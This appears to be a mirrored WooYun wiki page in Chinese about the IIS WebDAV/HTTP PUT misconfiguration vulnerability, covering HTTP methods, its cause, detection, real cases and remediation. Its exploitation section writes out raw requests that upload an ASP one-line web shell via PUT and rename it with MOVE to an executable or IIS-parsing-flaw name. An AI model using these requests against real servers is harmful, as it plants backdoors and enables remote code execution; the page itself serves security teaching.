@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh"
+  lang="zh" dir="ltr" class="no-js">
+
+<!-- Mirrored from wiki.wooyun.org/server:httpput?do=edit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:04 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>server:httpput [WooYun WiKi]</title>
+  <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <link rel="shortcut icon" href="lib/tpl/bootstrap3/images/favicon.ico" />
+<link rel="apple-touch-icon" href="lib/tpl/bootstrap3/images/apple-touch-icon.png" />
+      <link type="text/css" rel="stylesheet" href="lib/tpl/bootstrap3/assets/bootstrap/css/bootstrap.min.css" />
+    <script type="text/javascript">/*<![CDATA[*/
+    var TPL_CONFIG = {"tableFullWidth":1};
+  /*!]]>*/</script>
+  <meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="noindex,nofollow"/>
+<link rel="search" type="application/opensearchdescription+xml" href="http://wiki.wooyun.org/lib/exe/opensearch.php" title="WooYun WiKi"/>
+<link rel="start" href="http://wiki.wooyun.org/"/>
+<link rel="contents" href="http://wiki.wooyun.org/server:httpput?do=index" title="网站地图"/>
+<link rel="alternate" type="application/rss+xml" title="最近更改" href="http://wiki.wooyun.org/feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="http://wiki.wooyun.org/feed.php?mode=list&amp;ns=server"/>
+<link rel="alternate" type="text/html" title="纯HTML" href="http://wiki.wooyun.org/_export/xhtml/server:httpput"/>
+<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="http://wiki.wooyun.org/_export/raw/server:httpput"/>
+<link rel="stylesheet" type="text/css" href="http://wiki.wooyun.org/lib/exe/css.php?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='server';var JSINFO = {"id":"server:httpput","namespace":"server","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/exe/js.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
+<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/plugins/codeprettify/google-code-prettify/run_prettify.js?lang=css"></script>
+  <script type="text/javascript" src="http://wiki.wooyun.org/lib/tpl/bootstrap3/assets/bootstrap/js/bootstrap.min.js"></script>
+  <style type="text/css">
+    body { padding-top: 20px; }
+  </style>
+  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+  <script type="text/javascript" src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+  <script type="text/javascript" src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+  <![endif]-->
+</head>
+<body class="default page-on-panel">
+  <!--[if lte IE 7 ]><div id="IE7"><![endif]--><!--[if IE 8 ]><div id="IE8"><![endif]-->
+
+  <div id="dokuwiki__site" class="container">
+    <div id="dokuwiki__top" class="site dokuwiki mode_edit tpl_bootstrap3    ">
+
+      
+      <!-- header -->
+      <div id="dokuwiki__header">
+        <nav class="navbar  navbar-default" role="navigation">
+
+  <div class="container-fluid">
+
+    <div class="navbar-header">
+
+      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+
+      <a href="http://wiki.wooyun.org/WooYun WiKi"  accesskey="h" title="[H]" class="navbar-brand"><img src="http://wiki.wooyun.org/lib/tpl/bootstrap3/images/logo.png" alt="WooYun WiKi" class="pull-left" id="dw__logo" width="20" height="20" /> <span id="dw__title" >WooYun WiKi</span></a>
+    </div>
+
+    <div class="collapse navbar-collapse">
+
+      <ul class="nav navbar-nav" id="dw__navbar">
+        <li class="active">
+  <a href="http://wiki.wooyun.org/WooYun WiKi" ><i class="glyphicon glyphicon-home"></i> Home</a></li>
+      </ul>
+
+      <div class="navbar-right">
+
+        <form action="http://wiki.wooyun.org/WooYun WiKi" accept-charset="utf-8" class="search" id="dw__search" method="get" role="search"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="搜索" class="button" title="搜索" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>
+        <ul class="nav navbar-nav" id="dw__tools">
+  <li class="dropdown">
+    <a href="#" class="dropdown-toggle" data-toggle="dropdown" title="工具"><i class="glyphicon glyphicon-wrench"></i> <span class="hidden-lg hidden-md hidden-sm">工具</span> <span class="caret"></span></a>
+    <ul class="dropdown-menu tools" role="menu">
+
+      <!-- dokuwiki__usertools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-user"></i> 用户工具</li>
+      
+      <li class="divider"></li>
+
+      <!-- dokuwiki__sitetools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-cog"></i> 站点工具</li>
+      <li><a href="http://wiki.wooyun.org/server:httpput?do=recent"  class="action recent" accesskey="r" rel="nofollow" title="最近更改 [R]"><i class="glyphicon glyphicon-list-alt"></i> 最近更改</a></li><li><a href="http://wiki.wooyun.org/server:httpput?do=media&amp;ns=server"  class="action media" rel="nofollow" title="媒体管理器"><i class="glyphicon glyphicon-picture"></i> 媒体管理器</a></li><li><a href="http://wiki.wooyun.org/server:httpput?do=index"  class="action index" accesskey="x" rel="nofollow" title="网站地图 [X]"><i class="glyphicon glyphicon-list"></i> 网站地图</a></li>
+      <li class="divider"></li>
+
+      <!-- dokuwiki__pagetools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-file"></i> 页面工具</li>
+      <li class="active"><a href="http://wiki.wooyun.org/server:httpput?do="  class="action show" accesskey="v" rel="nofollow" title="显示页面 [V]"><i class="glyphicon glyphicon-edit"></i> 显示页面</a></li><li><a href="http://wiki.wooyun.org/server:httpput?do=revisions"  class="action revs" accesskey="o" rel="nofollow" title="修订记录 [O]"><i class="glyphicon glyphicon-time"></i> 修订记录</a></li><li><a href="http://wiki.wooyun.org/server:httpput?do=backlink"  class="action backlink" rel="nofollow" title="反向链接"><i class="glyphicon glyphicon-link"></i> 反向链接</a></li><li><a href="#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="回到顶部 [T]"><i class="glyphicon glyphicon-chevron-up"></i> 回到顶部</a></li>
+    </ul>
+  </li>
+</ul>
+
+        <ul class="nav navbar-nav">
+          <li>
+                      </li>
+                    <li><a href="http://wiki.wooyun.org/server:httpput?do=login&amp;sectok=a3845e1693337b10c6abaa01a16b0594"  class="action login" rel="nofollow" title="登录"><i class="glyphicon glyphicon-log-in"></i> 登录</a></li>        </ul>
+
+      </div>
+
+    </div>
+  </div>
+</nav>
+      </div>
+      <!-- /header -->
+
+      
+            <div id="dw__breadcrumbs">
+        <hr/>
+                        <div class="breadcrumb hidden-print"><span class="bchead">您的足迹:</span> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:basic"  class="breadcrumbs" title="wooyunwifi:basic">basic</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:console"  class="breadcrumbs" title="wooyunwifi:console">console</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:config"  class="breadcrumbs" title="wooyunwifi:config">config</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:bug_recovery"  class="breadcrumbs" title="wooyunwifi:bug_recovery">bug_recovery</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:github"  class="breadcrumbs" title="server:github">github</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:git"  class="breadcrumbs" title="server:git">git</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:svn"  class="breadcrumbs" title="server:svn">svn</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:ds_store"  class="breadcrumbs" title="server:ds_store">ds_store</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:sitebackup"  class="breadcrumbs" title="server:sitebackup">sitebackup</a></bdi> <span class="bcsep">•</span> <span class="curid"><bdi><a href="http://wiki.wooyun.org/server:web.xml"  class="breadcrumbs" title="server:web.xml">web.xml</a></bdi></span></div>
+                <hr/>
+      </div>
+      
+      <p class="pageId text-right">
+        <span class="label label-default">server:httpput</span>
+      </p>
+
+      <div id="dw__msgarea">
+              </div>
+
+      <main class="main row" role="main">
+
+        
+        <!-- ********** CONTENT ********** -->
+        <article id="dokuwiki__content" class="container" >
+
+          <div class="panel panel-default" > 
+            <div class="page group panel-body">
+
+                                          
+              <div class="pull-right hidden-print" data-spy="affix" data-offset-top="150" style="z-index:1024; top:10px; right:10px;">
+                              </div>
+
+              <!-- wikipage start -->
+              
+<p>
+本页面只读。您可以查看源文件，但不能更改它。如果您觉得这是系统错误，请联系管理员。
+</p>
+    <div class="editBox" role="application">
+
+    <div class="toolbar group">
+        <div id="draft__status"></div>
+        <div id="tool__bar"></div>
+    </div>
+    <form id="dw__editform" method="post" action="#" accept-charset="utf-8"><div class="no">
+<input type="hidden" name="sectok" value="a3845e1693337b10c6abaa01a16b0594" /><input type="hidden" name="id" value="server:httpput" /><input type="hidden" name="rev" value="0" /><input type="hidden" name="date" value="1437672424" /><input type="hidden" name="prefix" value="." /><input type="hidden" name="suffix" value="" /><input type="hidden" name="changecheck" value="73e0650dcf6185c29897fa8abc07f62e" /><input type="hidden" name="target" value="section" /><textarea name="wikitext" id="wiki__text" dir="auto" class="edit" cols="80" rows="10" tabindex="1" readonly="readonly">
+====== HTTP请求方法（PUT） ======
+
+==== 1、HTTP请求方法简介 ====
+
+----
+HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：
+
+  * OPTIONS：这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用'*'来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。
+  * HEAD：与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。
+  * GET：向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。参见安全方法
+  * POST：向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。
+  * PUT：向指定资源位置上传其最新内容。
+  * DELETE：请求服务器删除Request-URI所标识的资源。
+  * TRACE：回显服务器收到的请求，主要用于测试或诊断。
+  * CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。
+
+WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。
+
+IIS实现Webdav是采用的其两种接口CGI、ISAPI的ISAPI接口。
+
+但因为其没有采用影射的方式，所以IIS的主程序w3svc.dll本身包含了Webdav的信息。
+
+其识别出是Webdav的请求后就调用Webdav的处理模块httpext.dll。
+
+对于常见几种请求方法GET、HEAD、POST等，因为常见一些映射都支持。
+
+所以不能以请求方法作为Webdav请求的判断，w3svc.dll就根据请求头的字段识别。
+如果请求头里面包含Translate:、If:、Lock-Token:中的一种，就认为是Webdav的请求。
+
+Translate:就是那个Translate:f的泄露源代码的一个请求头，其实设置别的两个也是一样的。
+
+可能很多IDS是没有这点知识的。W3svc.dll还内置了几个别的请求方法TRACK、TRACE等。
+
+TRACK就是用于调试错误的，如果收到这样的请求头，w3svc.dll会原样返回请求数据。
+
+相当于我们常见的ping.exe。
+
+IIS对TRACK请求没有进行LOG记录，这点我们可以用于来获得banner。
+
+对于IIS将优于大家习惯使用的HEAD。
+
+如果上面的请求方法没匹配，那么w3svc.dll就会认为是Webdav的请求，交给httpext.dll处理了。
+
+这些请求包含Webdav支持的PROPFIND、PROPPATCH、MKCOL、DELETE、PUT、COPY、MOVE、LOCK、UNLOCK等。
+==== 2、漏洞成因 ====
+
+----
+web服务器默认是不开启PUT等方法的，出现该漏洞的原因主要是网站管理员对服务器的错误配置。常见的主要就是管理员错误地打开了IIS的服务器的webDAV而且没有开启权限验证，导致可以PUT文件到服务器再利用服务器的解析漏洞运行恶意代码或者用webDAV的MOVE方法将所上传的带有恶意代码的普通文件后缀修改为可执行文件后缀，运行恶意代码。
+
+若服务器开始了DELETE方法，是可以利用其删除网站上文件的，但是实际案例极少，而且开启了DELETE方法的服务器一般也会开始PUT方法，与PUT方法的危害相比，DELETE方法的危害显然要小得多。
+==== 3、漏洞的检测及利用 ====
+
+----
+对服务器发送OPTION包：
+&lt;code&gt;
+OPTIONS / HTTP/1.1
+Host: www.xxx.com
+&lt;/code&gt;
+若返回的HTTP响应头中带有PUT、MOVE等方法时则可以确定服务器开启了WebDAV。
+
+此时用PUT上传一个SHELL，但SHELL后缀不可以是可执行文件后缀。
+&lt;code&gt;
+PUT /test.txt HTTP/1.1
+Host: www.xxx.com
+Content-Length: 23
+
+&lt;%eval request(&quot;a&quot;)%&gt;
+&lt;/code&gt;
+若服务器启用了“WebDAV”扩展，并且复选了“写入”，就可以写入txt文件了。
+
+若服务器开启了“脚本资源访问”，可以用MOVE方法将txt后缀文件改成可执行文件的后缀。
+&lt;code&gt;
+MOVE /test.txt HTTP/1.1
+Host: www.xxx.com
+Destination: http://www.xxx.com/shell.asp
+&lt;/code&gt;
+
+若服务器关闭了“脚本资源访问”，可利用IIS解析漏洞来执行shell。
+&lt;code&gt;
+MOVE /test.txt HTTP/1.1
+Host: www.xxx.com
+Destination: http://www.xxx.com/test.asp;.jpg
+&lt;/code&gt;
+若服务器开启了DELETE方法，可以使用以下HTTP请求删除制定文件。
+&lt;code&gt;
+DELETE /test.txt HTTP/1.1
+Host: www.xxx.com
+&lt;/code&gt;
+
+你也可以使用以下的开源DAV管理工具：
+
+[[http://www.davexplorer.org/installation.html|DAV Explorer]]
+
+
+
+==== 4、实际案例 ====
+
+----
+[[http://www.wooyun.org/bugs/wooyun-2010-032273|15个gov edu的IISPUT漏洞合集]]
+
+[[http://www.wooyun.org/bugs/wooyun-2015-0101152|海康威视某通用系统配置不当可PUT文件]]
+
+[[http://www.wooyun.org/bugs/wooyun-2015-097612|某市红十字会由于iis配置不当导致put任意文件上传]]
+
+
+==== 5、漏洞修复 ====
+
+----
+**禁用WebDAV**
+
+通常情况下网站不需要支持额外的方法，右键WebDAV，点击禁用即可。
+
+**如果要使用WebDAV的话，加上权限验证**
+
+如果选取“脚本资源访问”，则用户将具备修改WebADV文件夹内的脚本文说明件(scriptfile)的功能。
+
+除了此处的虚拟目录权限外，还需要视NTFS权限，才可以决定用户是否有权限来访问WebDAV文件夹内的文件。
+
+WebDAV文件夹的NTFS权限给予用户适当的NTFS权限。
+
+首先请设置让Everyone组只有“读取”的权限，然后再针对个别用户给予“写入”的权限，例如我们给予用户“User”写入的权限。
+
+选择验证用户身份的方法启动“IIS管理器”，然后右击WebDAV虚拟目录，选择“属性”→“目录安全性”，单击“身份验证和访问控制”处的编辑按钮。
+
+不要选取“启用匿名访问”，以免招致攻击。选择安全的验证方法，选择“集成Windows身份验证”。
+
+
+==== 6、相关资源 ====
+
+----
+[[http://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE|超文本传输协议]]
+
+[[http://zh.wikipedia.org/wiki/WebDAV|WebDAV]]
+
+[[http://drops.wooyun.org/papers/238|IIS WebDAV安全配置]]
+
+[[http://hi.baidu.com/yuange1975/item/a836d31096b5b959f1090e89|IIS的Webdav简单介绍]]
+
+[[http://www.daxigua.com/archives/1597|远程分析IIS设置]]
+
+[[http://www.daxigua.com/archives/2750|小议IIS的特殊权限]]
+
+[[http://www.daxigua.com/archives/2747|IIS可以PUT，但无法MOVE的原因]]
+
+</textarea>
+<div id="wiki__editbar" class="editBar">
+<div id="size__ctl">
+</div>
+</div>
+</div></form>
+</div>
+
+              <!-- wikipage stop -->
+
+                            
+            </div>
+          </div>
+
+        </article>
+
+        
+      </main>
+
+      <footer id="dokuwiki__footer" class="small hidden-print">
+
+        <a href="javascript:void(0)" class="back-to-top hidden-print btn btn-default btn-sm" title="跳至内容>" id="back-to-top"><i class="glyphicon glyphicon-chevron-up"></i></a>
+
+                <div class="text-center">
+          <p id="dw__license">
+                      </p>
+                  </div>
+      </footer>
+
+      
+    </div><!-- /site -->
+
+    <div class="no"><img src="http://wiki.wooyun.org/lib/exe/indexer.php?id=server%3Ahttpput&amp;1449197578" width="2" height="1" alt="" /></div>
+    <div id="screen__mode" class="no">
+      <span class="visible-xs"></span>
+      <span class="visible-sm"></span>
+      <span class="visible-md"></span>
+      <span class="visible-lg"></span>
+    </div>
+  </div>
+  <!--[if ( lte IE 7 | IE 8 ) ]></div><![endif]-->
+</body>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "http://hm.baidu.com/hm.js?2e9369dace9479584f08203285c7cbce";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<!-- Mirrored from wiki.wooyun.org/server:httpput?do=edit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:04 GMT -->
+</html>
